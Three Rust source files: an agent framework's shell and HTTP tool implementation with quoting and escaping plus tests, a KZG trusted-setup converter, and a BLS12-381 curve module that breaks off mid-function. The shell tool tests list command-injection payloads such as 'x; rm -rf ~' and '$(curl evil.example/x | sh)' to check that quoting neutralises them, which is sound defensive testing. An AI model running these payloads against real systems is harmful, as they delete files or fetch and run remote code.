```rust
//! Shared, reusable `Tool` impls that the source adapters build tools out of:
//! [`ShellTool`] runs a templated shell command, [`HttpTool`] calls an HTTP
//! endpoint. Both are full `rc_core::Tool`s, so once a source produces one it
//! is indistinguishable from a built-in.

use async_trait::async_trait;
use rc_core::error::{ToolError, ToolResult};
use rc_core::schema::{ParamType, Parameter, Schema};
use rc_core::tool::{Tool, ToolContext, ToolSourceKind};
use serde::{Deserialize, Serialize};
use serde_json::Value;

// ─── ShellTool ───────────────────────────────────────────────────────────────

/// A tool backed by a shell command template. `{{param}}` placeholders are
/// substituted with the stringified parameter values, then the command runs
/// under `sh -c`. This is the engine behind the `declarative`, `cli`, `mcp`
/// and `marketplace` sources, and behind LLM-generated tools.
///
/// # Value contract
///
/// Every substituted value is passed through [`shell_quote`], so a parameter
/// value always arrives as **one literal shell word** — it can never break
/// out into shell syntax. Templates must therefore not wrap `{{param}}` in
/// their own quotes; write `printf %s {{msg}}`, not `printf %s "{{msg}}"`.
/// The command itself (the template) always runs — values are data, not
/// code.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellTool {
    pub name: String,
    pub description: String,
    pub schema: Schema,
    /// The command template, e.g. `git -C {{repo}} status --porcelain`.
    pub command: String,
    /// Which [`ToolSourceKind`] this tool should report (declarative / cli /
    /// llm_gen / …) — set by the source that built it.
    #[serde(default = "default_source")]
    pub source: String,
    /// Optional working directory for the command.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cwd: Option<String>,
}

fn default_source() -> String {
    "declarative".to_string()
}

impl ShellTool {
    pub fn new(
        name: impl Into<String>,
        description: impl Into<String>,
        schema: Schema,
        command: impl Into<String>,
        source: ToolSourceKind,
    ) -> Self {
        Self {
            name: name.into(),
            description: description.into(),
            schema,
            command: command.into(),
            source: source.as_str().to_string(),
            cwd: None,
        }
    }

    /// Render the command template: replace `{{name}}` with each param's
    /// stringified value, quoted as a single literal shell word (see
    /// [`shell_quote`]). Missing params are left as-is (the validator
    /// catches required ones earlier).
    fn render(&self, input: &Value) -> String {
        render_template_once(&self.command, &self.schema, input, |v| {
            shell_quote(&stringify(v))
        })
    }
}

fn stringify(v: &Value) -> String {
    match v {
        Value::String(s) => s.clone(),
        Value::Null => String::new(),
        other => other.to_string(),
    }
}

/// One-pass `{{param}}` substitution: the template is scanned left to right
/// exactly once and each `{{name}}` occurrence is replaced with the already
/// quoted/escaped value. Substituted text is never rescanned, so a value
/// that itself contains `{{...}}` is inert data — it can neither re-expand
/// a later placeholder nor shatter the quoting.
fn render_template_once(
    tmpl: &str,
    schema: &Schema,
    input: &Value,
    quote: impl Fn(&Value) -> String,
) -> String {
    let mut out = String::with_capacity(tmpl.len());
    let mut rest = tmpl;
    while let Some(start) = rest.find("{{") {
        out.push_str(&rest[..start]);
        let after = &rest[start + 2..];
        let Some(end) = after.find("}}") else {
            out.push_str("{{");
            rest = after;
            continue;
        };
        let name = &after[..end];
        let replacement = schema
            .parameters
            .iter()
            .find(|p| p.name == name)
            .and_then(|p| input.get(&p.name))
            .map(|v| quote(v));
        match replacement {
            Some(repl) => out.push_str(&repl),
            // Unknown or missing param: keep the placeholder verbatim.
            None => out.push_str(&rest[start..start + end + 4]),
        }
        rest = &after[end + 2..];
    }
    out.push_str(rest);
    out
}

/// Percent-encode `s` for a URL path/query component: RFC 3986 unreserved
/// bytes stay literal, everything else becomes `%XX` (so `&`, `#`, spaces
/// and quotes can never change the URL's structure).
fn url_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

/// Escape `s` for safe embedding inside a JSON string literal — the body
/// template keeps its own surrounding quotes, so this escapes quotes,
/// backslashes and control characters without adding any.
fn json_escape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out
}

/// Quote `s` as a single literal POSIX-shell word: wrap it in single quotes
/// and escape any embedded `'` as `'\''`. Every `{{param}}` value is routed
/// through this at substitution time, so untrusted input is always passed to
/// the command as *data* — `x; rm -rf ~` stays one argument (never three
/// shell commands), and `$(…)`, backticks and quotes lose their shell
/// meaning. The command template itself still runs untouched.
pub fn shell_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for c in s.chars() {
        if c == '\'' {
            // Close the quote, insert an escaped literal quote, reopen.
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

#[async_trait]
impl Tool for ShellTool {
    fn name(&self) -> &str {
        &self.name
    }
    fn description(&self) -> &str {
        &self.description
    }
    fn schema(&self) -> Schema {
        self.schema.clone()
    }
    fn source(&self) -> ToolSourceKind {
        match self.source.as_str() {
            "cli" => ToolSourceKind::Cli,
            "llm_gen" => ToolSourceKind::LlmGenerated,
            "openapi" => ToolSourceKind::OpenApi,
            "mcp" => ToolSourceKind::Mcp,
            "rest" => ToolSourceKind::Rest,
            "graphql" => ToolSourceKind::GraphQL,
            "marketplace" => ToolSourceKind::Marketplace,
            _ => ToolSourceKind::Declarative,
        }
    }
    async fn execute(&self, input: &Value, ctx: &ToolContext) -> ToolResult<Value> {
        if ctx.is_cancelled() {
            return Err(ToolError::Other("cancelled before shell tool".into()));
        }
        let rendered = self.render(input);
        let mut cmd = tokio::process::Command::new("sh");
        cmd.arg("-c").arg(&rendered);
        // If the executor's timeout drops this future, the spawned shell must
        // die with it instead of running on detached.
        cmd.kill_on_drop(true);
        if let Some(cwd) = &self.cwd {
            cmd.current_dir(cwd);
        }
        let output = cmd.output().await.map_err(|e| ToolError::ToolFailed {
            tool: self.name.clone(),
            inner: format!("spawn sh -c: {e}"),
        })?;
        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        let code = output.status.code().unwrap_or(-1);
        Ok(serde_json::json!({
            "exit_code": code,
            "stdout": stdout,
            "stderr": stderr,
        }))
    }
}

// ─── HttpTool ────────────────────────────────────────────────────────────────

/// A tool backed by an HTTP call. The URL and (optional) JSON body are
/// templates with `{{param}}` placeholders, substituted from the input. This
/// is the engine behind the `rest` source and the `openapi` source's per-path
/// tools.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpTool {
    pub name: String,
    pub description: String,
    pub schema: Schema,
    /// `GET`, `POST`, …
    pub method: String,
    /// URL template, e.g. `https://api.example.com/users/{{id}}`.
    pub url: String,
    /// Optional JSON body template (for POST/PUT/PATCH).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub body: Option<String>,
    /// Static headers to send.
    #[serde(default)]
    pub headers: Vec<(String, String)>,
    /// Which source kind to report.
    #[serde(default = "default_source")]
    pub source: String,
    /// Maximum bytes of response body to read into memory before
    /// truncating. `None` uses the default cap (1 MiB, matching the
    /// sandbox's default output limit). The cap is enforced *while*
    /// streaming, so an oversized response never lands fully in RAM.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub max_bytes: Option<usize>,
}

/// Default response-body cap for [`HttpTool`] (bytes).
const DEFAULT_HTTP_MAX_BYTES: usize = 1_000_000;

impl HttpTool {
    pub fn new(
        name: impl Into<String>,
        description: impl Into<String>,
        schema: Schema,
        method: impl Into<String>,
        url: impl Into<String>,
        source: ToolSourceKind,
    ) -> Self {
        Self {
            name: name.into(),
            description: description.into(),
            schema,
            method: method.into(),
            url: url.into(),
            body: None,
            headers: Vec::new(),
            source: source.as_str().to_string(),
            max_bytes: None,
        }
    }

    fn render(&self, input: &Value, tmpl: &str, in_url: bool) -> String {
        render_template_once(tmpl, &self.schema, input, |v| {
            let raw = stringify(v);
            if in_url {
                url_encode(&raw)
            } else {
                json_escape(&raw)
            }
        })
    }
}

#[async_trait]
impl Tool for HttpTool {
    fn name(&self) -> &str {
        &self.name
    }
    fn description(&self) -> &str {
        &self.description
    }
    fn schema(&self) -> Schema {
        self.schema.clone()
    }
    fn source(&self) -> ToolSourceKind {
        match self.source.as_str() {
            "openapi" => ToolSourceKind::OpenApi,
            "rest" => ToolSourceKind::Rest,
            "mcp" => ToolSourceKind::Mcp,
            "declarative" => ToolSourceKind::Declarative,
            "marketplace" => ToolSourceKind::Marketplace,
            _ => ToolSourceKind::Rest,
        }
    }
    async fn execute(&self, input: &Value, ctx: &ToolContext) -> ToolResult<Value> {
        ctx.check_net()?;
        let url = self.render(input, &self.url, true);
        let mk_err = |e: String| ToolError::ToolFailed {
            tool: self.name.clone(),
            inner: e,
        };
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(20))
            .build()
            .map_err(|e| mk_err(e.to_string()))?;
        let method = reqwest::Method::from_bytes(self.method.as_bytes())
            .map_err(|e| mk_err(format!("bad HTTP method {:?}: {e}", self.method)))?;
        let mut req = client.request(method, &url);
        for (k, v) in &self.headers {
            req = req.header(k, v);
        }
        if let Some(body_tmpl) = &self.body {
            let body = self.render(input, body_tmpl, false);
            // Try to send as JSON; fall back to raw string.
            match serde_json::from_str::<Value>(&body) {
                Ok(v) => {
                    req = req.header("content-type", "application/json").json(&v);
                }
                Err(_) => {
                    req = req.body(body);
                }
            }
        }
        let resp = req.send().await.map_err(|e| mk_err(e.to_string()))?;
        let status = resp.status().as_u16();
        // Stream the body with a running byte counter — never read an
        // unbounded response fully into RAM before applying the cap.
        let cap = self.max_bytes.unwrap_or(DEFAULT_HTTP_MAX_BYTES);
        let mut bytes: Vec<u8> = Vec::with_capacity(8_192);
        let mut truncated = false;
        let mut resp = resp;
        while let Some(chunk) = resp.chunk().await.map_err(|e| mk_err(e.to_string()))? {
            if bytes.len() + chunk.len() > cap {
                let take = cap.saturating_sub(bytes.len());
                bytes.extend_from_slice(&chunk[..take]);
                truncated = true;
                break;
            }
            bytes.extend_from_slice(&chunk);
        }
        let text = String::from_utf8_lossy(&bytes).to_string();
        // Try to parse the body as JSON; fall back to a raw string.
        let body: Value = serde_json::from_str(&text).unwrap_or(Value::String(text));
        Ok(serde_json::json!({
            "status": status,
            "body": body,
            "truncated": truncated,
        }))
    }
}

/// Helper to build a simple single-string-param schema.
pub fn one_string_param(name: &str, desc: &str) -> Schema {
    Schema::new().param(Parameter::required(name, ParamType::String).with_desc(desc))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_render_substitutes() {
        let t = ShellTool::new(
            "test.echo",
            "echo",
            one_string_param("msg", "the message"),
            "echo {{msg}}",
            ToolSourceKind::Declarative,
        );
        // Values are quoted into a single literal shell word.
        let rendered = t.render(&serde_json::json!({ "msg": "hello" }));
        assert_eq!(rendered, "echo 'hello'");
    }

    #[test]
    fn shell_quote_is_a_single_literal_word() {
        // `;`, `$()`, backticks and quotes must all be neutralized: the
        // value becomes exactly one argument, never shell syntax.
        for hostile in [
            "x; rm -rf ~",
            "$(curl evil.example/x | sh)",
            "`id` && echo pwned",
            "a'b\"c",
            "a\nb\t c",
            "",
        ] {
            let q = shell_quote(hostile);
            assert!(q.starts_with('\'') && q.ends_with('\''), "not wrapped: {q:?}");
            // The only unquoted `'`s are the escape sequence boundaries.
            let inner = &q[1..q.len() - 1];
            assert!(inner.matches("'\\''").count() == hostile.matches('\'').count());
            assert!(inner.replace("'\\''", "'") == hostile);
        }
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
    }

    #[test]
    fn shell_render_hostile_values_stay_literal() {
        let t = ShellTool::new(
            "test.echo",
            "echo",
            one_string_param("msg", "the message"),
            "printf %s {{msg}}",
            ToolSourceKind::Declarative,
        );
        for hostile in ["x; echo PWNED", "$(echo PWNED)", "`echo PWNED`", "a'b\"c"] {
            let rendered = t.render(&serde_json::json!({ "msg": hostile }));
            assert_eq!(rendered, format!("printf %s {}", shell_quote(hostile)));
        }
    }

    #[tokio::test]
    async fn shell_runs_echo() {
        let t = ShellTool::new(
            "test.echo",
            "echo",
            one_string_param("msg", ""),
            "printf %s {{msg}}",
            ToolSourceKind::Declarative,
        );
        let out = t
            .execute(&serde_json::json!({ "msg": "hi" }), &ToolContext::default())
            .await
            .unwrap();
        assert_eq!(out["exit_code"], 0);
        assert_eq!(out["stdout"], "hi");
    }

    #[tokio::test]
    async fn shell_injection_payloads_are_data_not_code() {
        // The injection payloads from the security review must reach the
        // command as one literal argument and be echoed back verbatim —
        // the command still runs, the value is never interpreted as shell.
        let t = ShellTool::new(
            "test.echo",
            "echo",
            one_string_param("msg", ""),
            "printf %s {{msg}}",
            ToolSourceKind::Declarative,
        );
        for hostile in [
            "x; echo PWNED",
            "x && echo PWNED",
            "$(echo PWNED)",
            "`echo PWNED`",
            "x | sh",
        ] {
            let out = t
                .execute(&serde_json::json!({ "msg": hostile }), &ToolContext::default())
                .await
                .unwrap();
            assert_eq!(out["exit_code"], 0, "payload {hostile:?}");
            assert_eq!(out["stdout"], hostile, "payload {hostile:?}");
            assert!(!out["stdout"].as_str().unwrap().contains("PWNED\n"));
        }
    }
}
```

```rust
//! One-shot tool: converts the official c-kzg-4844 trusted_setup.txt into the
//! compact binary blob embedded by rrx-bls381 (src/trusted_setup.bin).
//!
//! Every point is decompressed, checked on-curve AND in the r-subgroup, and
//! sanity-checked against the known G2 generator. Run once:
//!   cargo run --release -p rrx-bls381 --bin gen-setup

use rrx_bls381::curve::{g2_generator, G1Affine, G2Affine};
use std::path::PathBuf;

fn main() {
    let manifest = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let txt = std::fs::read_to_string(manifest.join("assets/trusted_setup.txt")).expect("trusted_setup.txt");
    let lines: Vec<&str> = txt.lines().map(|l| l.trim()).filter(|l| !l.is_empty()).collect();
    assert!(lines.len() >= 2, "bad setup file");
    let g1n: usize = lines[0].parse().unwrap();
    let g2n: usize = lines[1].parse().unwrap();
    assert_eq!(g1n, 4096);
    assert_eq!(g2n, 65);
    // c-kzg 2.x file layout: [g1_lagrange 4096][g2_monomial 65][g1_monomial 4096]
    // (the trailing monomial G1 block is an EIP-7594 extension; skip it, but
    //  verify its first entry is the canonical G1 generator as a sanity check)
    assert!(lines.len() == 2 + g1n + g2n || lines.len() == 2 + 2 * g1n + g2n, "unexpected setup layout");

    let g1_gen = rrx_bls381::curve::g1_generator();
    if lines.len() == 2 + 2 * g1n + g2n {
        let mono0 = G1Affine::decompress(&hex::decode(lines[2 + g1n + g2n]).unwrap()).unwrap();
        assert_eq!(mono0, g1_gen, "g1_monomial[0] != G1 generator — layout mismatch");
    }

    let t0 = std::time::Instant::now();
    let mut g1_out: Vec<u8> = Vec::with_capacity(g1n * 96);
    let mut checked_subgroup = 0;
    for (i, line) in lines[2..2 + g1n].iter().enumerate() {
        let raw = hex::decode(line).unwrap();
        assert_eq!(raw.len(), 48, "g1 line {i} not 48 bytes");
        let p = G1Affine::decompress(&raw).unwrap_or_else(|e| panic!("g1[{i}]: {e}"));
        assert!(p.is_on_curve(), "g1[{i}] not on curve");
        assert!(p.is_in_subgroup(), "g1[{i}] not in subgroup — flag convention wrong?");
        checked_subgroup += 1;
        g1_out.extend_from_slice(&p.x.to_be48());
        g1_out.extend_from_slice(&p.y.to_be48());
    }

    let mut g2_out: Vec<u8> = Vec::with_capacity(g2n * 192);
    for (i, line) in lines[2 + g1n..2 + g1n + g2n].iter().enumerate() {
        let raw = hex::decode(line).unwrap();
        assert_eq!(raw.len(), 96, "g2 line {i} not 96 bytes");
        let p = G2Affine::decompress(&raw).unwrap_or_else(|e| panic!("g2[{i}]: {e}"));
        assert!(p.is_on_curve(), "g2[{i}] not on curve");
        assert!(p.is_in_subgroup(), "g2[{i}] not in subgroup");
        if i == 0 {
            // [1]_2 must be the canonical G2 generator
            assert_eq!(p, g2_generator(), "setup g2[0] != canonical G2 generator");
        }
        g2_out.extend_from_slice(&p.x.c0.to_be48());
        g2_out.extend_from_slice(&p.x.c1.to_be48());
        g2_out.extend_from_slice(&p.y.c0.to_be48());
        g2_out.extend_from_slice(&p.y.c1.to_be48());
    }

    // ---- verkle Pedersen basis (256 points) ----
    let g1 = rrx_bls381::curve::g1_generator();
    let mut basis_bin = Vec::with_capacity(256 * 96);
    for i in 0..256usize {
        let mut buf = Vec::new();
        buf.extend_from_slice(b"rrx-verkle-leaf-v1");
        buf.extend_from_slice(&(i as u32).to_be_bytes());
        let h = rrx_util::keccak256(&buf);
        let s = rrx_bls381::fp::Fr::from_be_bytes_reduced(&h);
        let pt = g1.mul(&s.0);
        assert!(!pt.infinity && pt.is_on_curve() && pt.is_in_subgroup());
        basis_bin.extend_from_slice(&pt.x.to_be48());
        basis_bin.extend_from_slice(&pt.y.to_be48());
    }
    let manifest_b = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let basis_out = manifest_b.parent().unwrap().join("rrx-trie/src/verkle_basis.bin");
    std::fs::write(&basis_out, &basis_bin).unwrap();
    println!("verkle_basis.bin written: {} bytes", basis_bin.len());

    let mut bin = Vec::new();
    bin.extend_from_slice(b"RRXKZG1");
    bin.extend_from_slice(&(g1n as u32).to_be_bytes());
    bin.extend_from_slice(&(g2n as u32).to_be_bytes());
    bin.extend_from_slice(&g1_out);
    bin.extend_from_slice(&g2_out);
    let out = manifest.join("src/trusted_setup.bin");
    std::fs::write(&out, &bin).unwrap();
    println!(
        "trusted_setup.bin written: {} bytes ({} G1 + {} G2, all on-curve; {} subgroup checks; {:?})",
        bin.len(),
        g1n,
        g2n,
        checked_subgroup,
        t0.elapsed()
    );
}
```

```rust
//! G1 (over Fp) and G2 (over Fp2) — BLS12-381 curve points, projective ops,
//! multi-scalar multiplication (Pippenger), and EIP-2537 byte encodings.

use super::fp::{r_suborder, Fp};
use super::fp2::Fp2;
use num_bigint::BigUint;
use num_traits::Zero;

pub const B_G1: u64 = 4;
pub const B_G2_C0: u64 = 4;
pub const B_G2_C1: u64 = 4;

/// EIP-2537 G1 generator (hex, from the spec).
pub const G1_GEN_X: &str = "17f1d3a73197d7942695638c4fa9ac0fc3688c4f9774b905a14e3a3f171bac586c55e83ff97a1aeffb3af00adb22c6bb";
pub const G1_GEN_Y: &str = "08b3f481e3aaa0f1a09e30ed741d8ae4fcf5e095d5d00af600db18cb2c04b3edd03cc744a2888ae40caa232946c5e7e1";

/// EIP-2537 G2 generator (c0/c1 pairs).
pub const G2_GEN_X_C0: &str = "024aa2b2f08f0a91260805272dc51051c6e47ad4fa403b02b4510b647ae3d1770bac0326a805bbefd48056c8c121bdb8";
pub const G2_GEN_X_C1: &str = "13e02b6052719f607dacd3a088274f65596bd0d09920b61ab5da61bbdc7f5049334cf11213945d57e5ac7d055d042b7e";
pub const G2_GEN_Y_C0: &str = "0ce5d527727d6e118cc9cdc6da2e351aadfd9baa8cbdd3a76d429a695160d12c923ac9cc3baca289e193548608b82801";
pub const G2_GEN_Y_C1: &str = "0606c4a02ea734cc32acd2b02bc28b99cb3e287e85a763af267492ab572e99ab3f370d275cec1da1aaa9075ff05f79be";

fn parse_fp_hex(s: &str) -> Fp {
    Fp::from_be_bytes(&hex::decode(s).unwrap())
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct G1Affine {
    pub x: Fp,
    pub y: Fp,
    pub infinity: bool,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct G2Affine {
    pub x: Fp2,
    pub y: Fp2,
    pub infinity: bool,
}

pub fn g1_generator() -> G1Affine {
    G1Affine { x: parse_fp_hex(G1_GEN_X), y: parse_fp_hex(G1_GEN_Y), infinity: false }
}

pub fn g2_generator() -> G2Affine {
    G2Affine {
        x: Fp2::new(parse_fp_hex(G2_GEN_X_C0), parse_fp_hex(G2_GEN_X_C1)),
        y: Fp2::new(parse_fp_hex(G2_GEN_Y_C0), parse_fp_hex(G2_GEN_Y_C1)),
        infinity: false,
    }
}

impl G1Affine {
    pub fn identity() -> G1Affine { G1Affine { x: Fp::zero(), y: Fp::zero(), infinity: true } }

    pub fn is_on_curve(&self) -> bool {
        if self.infinity {
            return self.x.is_zero() && self.y.is_zero();
        }
        // y^2 == x^3 + 4
        self.y.square() == self.x.square().mul(&self.x).add(&Fp::from_u64(B_G1))
    }

    pub fn is_in_subgroup(&self) -> bool {
        if self.infinity { return true; }
        self.mul(&r_suborder()).infinity
    }

    pub fn neg(&self) -> G1Affine {
        if self.infinity { self.clone() } else { G1Affine { x: self.x.clone(), y: self.y.neg(), infinity: false } }
    }

    pub fn add(&self, o: &G1Affine) -> G1Affine {
        if self.infinity { return o.clone(); }
        if o.infinity { return self.clone(); }
        if self.x == o.x {
            if self.y == o.y {
                return self.double();
            }
            return G1Affine::identity();
        }
        // chord slope
        let lambda = o.y.sub(&self.y).mul(&o.x.sub(&self.x).inv().unwrap());
        let x3 = lambda.square().sub(&self.x).sub(&o.x);
        let y3 = lambda.mul(&self.x.sub(&x3)).sub(&self.y);
        G1Affine { x: x3, y: y3, infinity: false }
    }

    pub fn double(&self) -> G1Affine {
        if self.infinity || self.y.is_zero() {
            return G1Affine::identity();
        }
        let lambda = self.x.square().mul(&Fp::from_u64(3)).mul(&self.y.double().inv().unwrap());
        let x3 = lambda.square().sub(&self.x.double());
        let y3 = lambda.mul(&self.x.sub(&x3)).sub(&self.y);
        G1Affine { x: x3, y: y3, infinity: false }
    }

    pub fn mul(&self, k: &BigUint) -> G1Affine {
        let mut r = G1Jac::identity();
        let bytes = k.to_bytes_be();
        for byte in &bytes {
            for i in (0..8).rev() {
                r = r.double();
                if (byte >> i) & 1 == 1 {
                    r = r.add_affine(self);
                }
            }
        }
        r.to_affine()
    }

    /// EIP-2537 uncompressed encoding: x (64B BE) || y (64B BE); infinity = 128 zero bytes.
    pub fn encode128(&self) -> [u8; 128] {
        let mut out = [0u8; 128];
        if !self.infinity {
            out[..64].copy_from_slice(&be64(&self.x));
            out[64..].copy_from_slice(&be64(&self.y));
        }
        out
    }

    pub fn decode128(bytes: &[u8]) -> Result<G1Affine, String> {
        if bytes.len() != 128 {
            return Err("G1: need 128 bytes".into());
        }
        let x = be64_to_fp(&bytes[..64])?;
        let y = be64_to_fp(&bytes[64..])?;
        if x.is_zero() && y.is_zero() {
            return Ok(G1Affine::identity());
        }
        let p = G1Affine { x, y, infinity: false };
        if !p.is_on_curve() {
            return Err("G1: point not on curve".into());
        }
        Ok(p)
    }

    /// ZCash-format compressed encoding (48 bytes): x with flag bits
    /// 0x80 = compressed, 0x40 = infinity, 0x20 = y-lexicographically-greater.
    pub fn compress(&self) -> [u8; 48] {
        let mut out = self.x.to_be48();
        if self.infinity {
            out[0] |= 0xc0; // compressed + infinity
            return out;
        }
        out[0] |= 0x80;
        if is_y_greater_fp(&self.y) {
            out[0] |= 0x20;
        }
        out
    }

    pub fn decompress(bytes: &[u8]) -> Result<G1Affine, String> {
        if bytes.len() != 48 {
            return Err("G1: need 48 bytes".into());
        }
        if bytes[0] & 0x80 == 0 {
            return Err("G1: uncompressed point not supported here".into());
        }
        if bytes[0] & 0x40 != 0 {
            return Ok(G1Affine::identity());
        }
        let mut xbytes = [0u8; 48];
        xbytes.copy_from_slice(bytes);
        xbytes[0] &= 0x1f;
        let x = Fp::from_be48(&xbytes)?;
        let y2 = x.square().mul(&x).add(&Fp::from_u64(B_G1));
        let mut y = y2.sqrt().map_err(|_| "G1: x is not on curve".to_string())?;
        let greater_flag = bytes[0] & 0x20 != 0;
        if is_y_greater_fp(&y) != greater_flag {
            y = y.neg();
        }
        let p = G1Affine { x, y, infinity: false };
        if !p.is_on_curve() {
            return Err("G1: decompressed point not on curve".into());
        }
        Ok(p)
    }
}

fn is_y_greater_fp(y: &Fp) -> bool {
    // "greater" = y > p - y  (lexicographic on canonical BE bytes = numeric compare)
    let neg = y.neg();
    y.0 > neg.0
}

fn is_y_greater_fp2(y: &Fp2) -> bool {
    // compare c1 first, then c0 (big-endian coefficient order per zcash/blst)
    let neg = y.neg();
    if y.c1.0 != neg.c1.0 {
        y.c1.0 > neg.c1.0
    } else {
        y.c0.0 > neg.c0.0
    }
}

fn be64(v: &Fp) -> [u8; 64] {
    let b = v.0.to_bytes_be();
    let mut out = [0u8; 64];
    let start = 64usize.saturating_sub(b.len());
    out[start..].copy_from_slice(&b);
    out
}

fn be64_to_fp(bytes: &[u8]) -> Result<Fp, String> {
    if bytes.len() != 64 {
        return Err("Fp: need 64 bytes".into());
    }
    // top 16 bytes must be zero (value < 381-bit p in 64-byte encoding)
    if bytes[..16].iter().any(|&b| b != 0) {
        return Err("Fp: top 16 bytes must be zero".into());
    }
    Ok(Fp::from_be48(&bytes[16..])?)
}

impl G2Affine {
    pub fn identity() -> G2Affine { G2Affine { x: Fp2::zero(), y: Fp2::zero(), infinity: true } }

    pub fn is_on_curve(&self) -> bool {
        if self.infinity {
            return self.x.is_zero() && self.y.is_zero();
        }
        // y^2 == x^3 + 4(1+u)
        let b = Fp2::new(Fp::from_u64(B_G2_C0), Fp::from_u64(B_G2_C1));
        self.y.square() == self.x.square().mul(&self.x).add(&b)
    }

    pub fn is_in_subgroup(&self) -> bool {
        if self.infinity { return true; }
        self.mul(&r_suborder()).infinity
    }

    pub fn neg(&self) -> G2Affine {
        if self.infinity { self.clone() } else { G2Affine { x: self.x.clone(), y: self.y.neg(), infinity: false } }
    }

    pub fn add(&self, o: &G2Affine) -> G2Affine {
        if self.infinity { return o.clone(); }
        if o.infinity { return self.clone(); }
        if self.x == o.x {
            if self.y == o.y {
                return self.double();
            }
            return G2Affine::identity();
        }
        let lambda = o.y.sub(&self.y).mul(&o.x.sub(&self.x).inv().unwrap());
        let x3 = lambda.square().sub(&self.x).sub(&o.x);
        let y3 = lambda.mul(&self.x.sub(&x3)).sub(&self.y);
        G2Affine { x: x3, y: y3, infinity: false }
    }

    pub fn double(&self) -> G2Affine {
        if self.infinity || self.y.is_zero() {
            return G2Affine::identity();
        }
        let lambda = self.x.square().mul(&Fp2::new(Fp::from_u64(3), Fp::zero())).mul(&self.y.double().inv().unwrap());
        let x3 = lambda.square().sub(&self.x.double());
        let y3 = lambda.mul(&self.x.sub(&x3)).sub(&self.y);
        G2Affine { x: x3, y: y3, infinity: false }
    }

    pub fn mul(&self, k: &BigUint) -> G2Affine {
        let mut r = G2Affine::identity();
        let bytes = k.to_bytes_be();
        for byte in &bytes {
            for i in (0..8).rev() {
                r = r.double();
                if (byte >> i) & 1 == 1 {
                    r = r.add(self);
                }
            }
        }
        r
    }

    /// EIP-2537 uncompressed: x(c0||c1 128B) || y(c0||c1 128B); infinity = 256 zeros.
    pub fn encode256(&self) -> [u8; 256] {
        let mut out = [0u8; 256];
        if !self.infinity {
            out[..64].copy_from_slice(&be64(&self.x.c0));
            out[64..128].copy_from_slice(&be64(&self.x.c1));
            out[128..192].copy_from_slice(&be64(&self.y.c0));
            out[192..].copy_from_slice(&be64(&self.y.c1));
        }
        out
    }

    pub fn decode256(bytes: &[u8]) -> Result<G2Affine, String> {
        if bytes.len() != 256 {
            return Err("G2: need 256 bytes".into());
        }
        let x = Fp2::new(be64_to_fp(&bytes[..64])?, be64_to_fp(&bytes[64..128])?);
        let y = Fp2::new(be64_to_fp(&bytes[128..192])?, be64_to_fp(&bytes[192..])?);
        if x.is_zero() && y.is_zero() {
            return Ok(G2Affine::identity());
        }
        let p = G2Affine { x, y, infinity: false };
        if !p.is_on_curve() {
            return Err("G2: point not on curve".into());
        }
        Ok(p)
    }

    /// ZCash-format compressed (96 bytes): x_c1 || x_c0 with flags in first byte.
    pub fn compress(&self) -> [u8; 96] {
        let mut out = [0u8; 96];
        out[..48].copy_from_slice(&self.x.c1.to_be48());
        out[48..].copy_from_slice(&self.x.c0.to_be48());
        if self.infinity {
            out[0] |= 0xc0;
            return out;
        }
        out[0] |= 0x80;
        if is_y_greater_fp2(&self.y) {
            out[0] |= 0x20;
        }
        out
    }

    pub fn decompress(bytes: &[u8]) -> Result<G2Affine, String> {
        if bytes.len() != 96 {
            return Err("G2: need 96 bytes".into());
        }
        if bytes[0] & 0x80 == 0 {
            return Err("G2: uncompressed point not supported here".into());
        }
        if bytes[0] & 0x40 != 0 {
            return Ok(G2Affine::identity());
        }
        let mut xbytes = [0u8; 96];
        xbytes.copy_from_slice(bytes);
        xbytes[0] &= 0x1f;
        let xc1 = Fp::from_be48(&xbytes[..48])?;
        let xc0 = Fp::from_be48(&xbytes[48..])?;
        let x = Fp2::new(xc0, xc1);
        let b = Fp2::new(Fp::from_u64(B_G2_C0), Fp::from_u64(B_G2_C1));
        let y2 = x.square().mul(&x).add(&b);
        let mut y = y2.sqrt().map_err(|_| "G2: x is not on curve".to_string())?;
        let greater_flag = bytes[0] & 0x20 != 0;
        if is_y_greater_fp2(&y) != greater_flag {
            y = y.neg();
        }
        let p = G2Affine { x, y, infinity: false };
        if !p.is_on_curve() {
            return Err("G2: decompressed point not on curve".into());
        }
        Ok(p)
    }
}

// ---------- projective (Jacobian) arithmetic: removes per-op inversions ----------

#[derive(Clone, Debug)]
struct G1Jac {
    x: Fp,
    y: Fp,
    z: Fp,
}

impl G1Jac {
    fn identity() -> G1Jac {
        G1Jac { x: Fp::one(), y: Fp::one(), z: Fp::zero() }
    }

    fn from_affine(p: &G1Affine) -> G1Jac {
        if p.infinity {
            Self::identity()
        } else {
            G1Jac { x: p.x.clone(), y: p.y.clone(), z: Fp::one() }
        }
    }

    fn is_identity(&self) -> bool {
        self.z.is_zero()
    }

    fn double(&self) -> G1Jac {
        if self.is_identity() {
            return self.clone();
        }
